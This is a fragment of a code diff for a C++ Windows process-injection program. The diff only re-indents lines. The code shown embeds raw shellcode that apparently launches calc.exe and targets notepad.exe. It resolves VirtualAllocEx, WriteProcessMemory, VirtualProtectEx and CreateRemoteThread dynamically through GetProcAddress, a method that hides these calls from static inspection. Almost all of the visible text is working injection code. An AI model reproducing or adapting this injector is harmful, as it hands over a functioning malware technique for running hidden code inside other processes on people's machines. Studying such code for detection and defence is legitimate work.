@@ -93,10 +93,10 @@ int main() {
         "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
         "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
 
-	  P_VirtualAllocEx myVirtualAllocEx = nullptr;
-	  P_WriteProcessMemory myWriteProcessMemory = nullptr;
-	  P_VirtualProtectEx myVirtualProtectEx = nullptr;
-	  P_CreateRemoteThread myCreateRemoteThread = nullptr;
+    P_VirtualAllocEx myVirtualAllocEx = nullptr;
+    P_WriteProcessMemory myWriteProcessMemory = nullptr;
+    P_VirtualProtectEx myVirtualProtectEx = nullptr;
+    P_CreateRemoteThread myCreateRemoteThread = nullptr;
 
     DWORD pid = 0;
     const wchar_t* processName = L"notepad.exe";
@@ -123,13 +123,13 @@ int main() {
         return -1;
     }
 	
-	  // Use GetProcAddress to get the address of the VirtualAllocEx function
-	  myVirtualAllocEx = (P_VirtualAllocEx)GetProcAddress(hKernel32, "VirtualAllocEx");
-	  if (myVirtualAllocEx == nullptr) {
-		    printf("[ERROR] Failed to resolve VirtualAllocEx. Error: %u\n", GetLastError());
-		    FreeLibrary(hKernel32); // Clean up the module handle
-		    return -1;
-	  }
+    // Use GetProcAddress to get the address of the VirtualAllocEx function
+    myVirtualAllocEx = (P_VirtualAllocEx)GetProcAddress(hKernel32, "VirtualAllocEx");
+    if (myVirtualAllocEx == nullptr) {
+        printf("[ERROR] Failed to resolve VirtualAllocEx. Error: %u\n", GetLastError());
+        FreeLibrary(hKernel32); // Clean up the module handle
+        return -1;
+    }
 
     // Use GetProcAddress to get the address of the WriteProcessMemory function
     myWriteProcessMemory = (P_WriteProcessMemory)GetProcAddress(hKernel32, "WriteProcessMemory");
@@ -147,13 +147,13 @@ int main() {
         return -1;
     }
 
-	  // Use GetProcAddress to get the address of the CreateRemoteThread function
-	  myCreateRemoteThread = (P_CreateRemoteThread)GetProcAddress(hKernel32, "CreateRemoteThread");
-	  if (myCreateRemoteThread == nullptr) {
-		    printf("[ERROR] Failed to resolve CreateRemoteThread. Error: %u\n", GetLastError());
-		    FreeLibrary(hKernel32); // Clean up the module handle
-		    return -1;
-	  }	
+    // Use GetProcAddress to get the address of the CreateRemoteThread function
+    myCreateRemoteThread = (P_CreateRemoteThread)GetProcAddress(hKernel32, "CreateRemoteThread");
+    if (myCreateRemoteThread == nullptr) {
+        printf("[ERROR] Failed to resolve CreateRemoteThread. Error: %u\n", GetLastError());
+        FreeLibrary(hKernel32); // Clean up the module handle
+        return -1;
+    }	
 
     printf("[*] Successfully opened handle to PID: %u\n", pid);
 
@@ -207,7 +207,7 @@ int main() {
     CloseHandle(pHandle);
     CloseHandle(tHandle);
     VirtualFree(bufferAddress, 0, MEM_RELEASE);
-	  FreeLibrary(hKernel32); // Clean up the module handle
+	FreeLibrary(hKernel32); // Clean up the module handle
 
     printf("[*] Process injection complete.\n");
 
